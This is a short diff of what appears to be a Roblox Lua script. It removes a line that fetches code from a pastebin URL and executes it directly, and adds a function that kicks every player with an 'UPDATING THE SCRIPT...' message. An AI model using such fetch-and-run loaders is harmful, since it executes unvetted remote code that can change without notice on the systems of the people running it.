@@ -1,1 +1,10 @@
-loadstring(game:HttpGet("https://pastebin.com/raw/tsa4LpUT"))()
+local players = game:GetService("Players")
+local message = "UPDATING THE SCRIPT..."
+
+function Shutdown()
+   for i, v in pairs(players:GetChildren()) do
+    v:Kick(message)
+end
+end
+
+Shutdown()
